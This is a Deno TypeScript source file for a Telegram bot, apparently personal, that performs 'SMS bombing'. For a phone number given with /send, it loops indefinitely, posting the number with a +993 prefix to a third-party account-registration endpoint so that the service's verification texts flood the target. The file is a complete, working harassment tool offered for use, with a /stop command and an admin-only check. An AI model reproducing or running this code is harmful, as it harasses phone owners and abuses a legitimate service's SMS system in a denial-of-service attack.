// main.ts
// 💥 Masakoff SMS Sender Bot (Deno)
// 🚀 Created by @Masakoff | FlapsterMinerManager
// Sends POST requests in batches of 3 with delays via Telegram webhook
// ✨ Includes global /stop command to halt all running SMS tasks

import { serve } from "https://deno.land/std@0.224.0/http/server.ts";
import { delay } from "https://deno.land/std@0.224.0/async/delay.ts";

// --- 🔐 Telegram settings ---
const TOKEN = Deno.env.get("BOT_TOKEN");
if (!TOKEN) throw new Error("❌ BOT_TOKEN env var is required");
const API = `https://api.telegram.org/bot${TOKEN}`;
const SECRET_PATH = "/masakoffvpnhelper";

// --- 👑 Admin username ---
const ADMIN_USERNAME = "Masakoff";

// --- 💬 Helper: send message to Telegram ---
async function sendMessage(chatId: string, text: string, options: any = {}) {
  try {
    const body = { chat_id: chatId, text, ...options };
    await fetch(`${API}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });
  } catch (e) {
    console.error("sendMessage error ❌", e);
  }
}

// --- 🌐 Helper: send POST request ---
async function sendPostRequest(url: string, headers: Record<string, string>, data: Record<string, any>) {
  try {
    const resp = await fetch(url, {
      method: "POST",
      headers,
      body: JSON.stringify(data),
    });
    return resp.status === 200;
  } catch {
    return false;
  }
}

// --- 🧠 Track all active tasks ---
const activeTasks = new Map<string, { stop: boolean }>();

// --- 💣 SMS sending logic ---
async function sendSMS(phoneNumber: string, chatId: string) {
  const requestsData = [
    {
      url: "https://api.saray.tm/api/v1/accounts",
      headers: {
        "Accept": "application/json",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "api.saray.tm",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/4.12.0"
      },
      data: { phone: `+993${phoneNumber}` }
    }
  ];

  const task = { stop: false };
  activeTasks.set(chatId, task);

  let count = 0;
  await sendMessage(chatId, `📱 Starting SMS bombing for +993${phoneNumber} 🔥`);

  while (!task.stop) {
    for (let batch = 0; batch < 3; batch++) {
      if (task.stop) break;
      count++;
      for (const req of requestsData) {
        if (task.stop) break;
        await sendMessage(chatId, `📤 Sending SMS #${count} to +993${phoneNumber}...`);
        const success = await sendPostRequest(req.url, req.headers, req.data);
        await sendMessage(chatId, success ? "✅ Sent successfully!" : "⚠️ Failed to send.");
        await delay(5000); // ⏱ Wait 5 seconds between each
      }
    }
    if (task.stop) break;
    await sendMessage(chatId, "⏳ 3 SMS sent! Waiting 45 seconds before next batch...");
    await delay(45000);
  }

  activeTasks.delete(chatId);
  await sendMessage(chatId, "⏹ All SMS processes stopped. 💫 Thank you for using @Masakoff bot!");
}

// --- 🖥️ Webhook Server ---
serve(async (req) => {
  if (req.method !== "POST" || new URL(req.url).pathname !== SECRET_PATH) {
    return new Response("Invalid request ❌", { status: 400 });
  }

  const update = await req.json();

  // Only handle private messages
  if (!update.message || update.message.chat.type !== "private") {
    return new Response("OK");
  }

  const chatId = update.message.chat.id;
  const text = (update.message.text ?? "").trim();
  const username = update.message.from?.username ?? "";

  // --- 🔐 Admin Check ---
  if (username !== ADMIN_USERNAME) {
    await sendMessage(chatId, "🚫 Access denied!\nThis bot is for @Masakoff only 👑");
    return new Response("OK");
  }

  // --- ⚙️ Commands ---
  if (text.startsWith("/start")) {
    await sendMessage(
      chatId,
      "👋 Welcome to the 💥 Masakoff SMS Sender Bot 💥\n\n" +
      "📲 Use:\n" +
      "• /send <number> — start sending SMS\n" +
      "• /stop — stop all sending immediately ⛔\n\n" +
      "✨ Created by @Masakoff | FlapsterMinerManager"
    );
  }

  else if (text.startsWith("/send")) {
    const parts = text.split(" ");
    if (parts.length < 2) {
      await sendMessage(chatId, "⚠️ Please provide a phone number.\nExample: /send 61234567");
    } else {
      const phoneNumber = parts[1].replace(/^\+993/, "");
      await sendMessage(chatId, `🚀 Starting SMS bombing for +993${phoneNumber}...`);
      sendSMS(phoneNumber, chatId).catch(console.error);
    }
  }

  else if (text.startsWith("/stop")) {
    if (activeTasks.size > 0) {
      for (const task of activeTasks.values()) {
        task.stop = true;
      }
      await sendMessage(chatId, "🛑 All running SMS tasks have been stopped successfully!");
      activeTasks.clear();
    } else {
      await sendMessage(chatId, "ℹ️ No active SMS tasks found to stop.");
    }
  }

  else {
    await sendMessage(chatId, "❓ Unknown command.\nTry /start, /send <number>, or /stop.");
  }

  return new Response("OK");
});




